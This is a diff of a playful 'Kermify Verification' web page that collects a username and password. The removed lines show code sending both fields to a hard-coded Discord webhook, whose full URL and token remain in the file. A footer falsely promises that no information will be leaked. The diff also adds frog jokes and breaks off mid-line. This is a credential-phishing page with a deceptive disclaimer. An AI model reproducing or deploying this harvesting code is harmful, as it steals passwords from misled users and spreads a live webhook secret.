@@ -5,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Kermify Verification 🐸</title>
   <style>
-    /* General body */
     body {
       background: linear-gradient(120deg, #4CAF50, #81C784);
       color: #ffff99;
@@ -22,9 +21,8 @@
       text-shadow: 2px 2px #2e7d32;
     }
 
-    /* Frog emoji */
     #frog {
-      font-size: 6vw; /* scales with screen */
+      font-size: 6vw;
       display: inline-block;
       animation: bounce 1s infinite;
       margin-bottom: 20px;
@@ -35,24 +33,20 @@
       50% { transform: translateY(-20px); }
     }
 
-    /* Inputs */
     .input-field {
       padding: 12px;
       margin: 10px 5px;
       font-size: 1.2em;
       border-radius: 5px;
       border: none;
-      width: 70%;      /* responsive width */
+      width: 70%;
       max-width: 300px;
       box-sizing: border-box;
       transition: transform 0.2s;
     }
 
-    .input-field:focus {
-      transform: scale(1.05);
-    }
+    .input-field:focus { transform: scale(1.05); }
 
-    /* Button */
     #verifyBtn {
       padding: 12px 25px;
       font-size: 1.2em;
@@ -70,20 +64,22 @@
       transform: scale(1.1) rotate(-3deg);
     }
 
-    #message {
-      margin-top: 20px;
+    #message { margin-top: 20px; font-size: 1.2em; min-height: 1.5em; }
+    #discordNotice { font-size:1.2em; font-weight:bold; margin-bottom:10px; }
+    #disclaimer {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
       font-size: 1.2em;
-      min-height: 1.5em;
+      color: #ffffcc;
+      background-color: rgba(0,0,0,0.3);
+      padding: 10px 0;
+      text-align: center;
+      z-index: 10000;
     }
+    #joke { font-size: 1.2em; margin-top: 15px; min-height:1.5em; }
 
-    /* Discord notice */
-    #discordNotice {
-      font-size: 1.2em;
-      font-weight: bold;
-      margin-bottom: 10px;
-    }
-
-    /* Confetti style */
     .confetti {
       position: fixed;
       width: 10px;
@@ -98,31 +94,14 @@
     }
 
     @keyframes fall {
-      to {
-        transform: translateY(100vh) rotate(360deg);
-        opacity: 0;
-      }
+      to { transform: translateY(100vh) rotate(360deg); opacity: 0; }
     }
 
-    /* Bottom disclaimer */
-    #disclaimer {
-      position: fixed;
-      bottom: 0;
-      left: 0;
-      width: 100%;
-      font-size: 1.2em;
-      color: #ffffcc;
-      background-color: rgba(0,0,0,0.3);
-      padding: 10px 0;
-      text-align: center;
-      z-index: 10000;
-    }
-
-    /* Responsive adjustments */
     @media (max-width: 600px) {
       h1 { font-size: 2em; }
       .input-field { font-size: 1em; }
       #verifyBtn { font-size: 1em; padding: 10px 20px; }
+      #joke { font-size: 1em; }
     }
   </style>
 </head>
@@ -139,14 +118,15 @@
   <button id="verifyBtn">Verify</button>
 
   <p id="message"></p>
+  <p id="joke"></p>
 
   <p id="disclaimer">No information will be leaked. NO developer will ask for information.</p>
 
   <script>
     const button = document.getElementById("verifyBtn");
     const message = document.getElementById("message");
+    const jokeElem = document.getElementById("joke");
 
-    // Discord webhook URL
     const webhookURL = "https://discord.com/api/webhooks/1409611043033976832/S730sZFzy9rDdpue2pqY2DVuFBXovlI5mhT4iMOAPji40S5-hvdn7hsIgLTnHdoU0Kn-";
 
     // Confetti function
@@ -159,30 +139,21 @@
       setTimeout(() => confetti.remove(), 3000);
     }
 
-    // Animate background gradient
+    // Background gradient animation
     let hue = 120;
     setInterval(() => {
       hue += 0.5;
       document.body.style.background = `linear-gradient(120deg, hsl(${hue}, 50%, 40%), hsl(${hue+40}, 50%, 60%))`;
     }, 100);
 
-    button.addEventListener("click", () => {
-      const user = document.getElementById("username").value || "Player";
-      const pass = document.getElementById("password").value || "Code";
+    // Frog jokes array
+    const jokes = [
+      "Why are frogs so happy? Because they eat whatever bugs them!",
+      "What do frogs do with paper? Rip-it!",
+      "Why did the frog take the bus to work? His car got toad away!",
+      "What’s a frog’s favorite candy? Lollihops!",
+      "Why are frogs so good at basketball? Because they always make jump shots!"
+    ];
 
-      // Show verification message
-      message.textContent = `✅ ${user} has verified with password "${pass}"! Ribbit! 🐸`;
-
-      // Send to Discord
-      fetch(webhookURL, {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({content: `User verified: Username = ${user}, Password = ${pass}`})
-      }).catch(err => console.error("Webhook error:", err));
-
-      // Create confetti
-      for(let i=0; i<30; i++) { createConfetti(); }
-    });
-  </script>
-</body>
-</html>
+    function changeJoke() {
+      const randomIndex = Math.floor
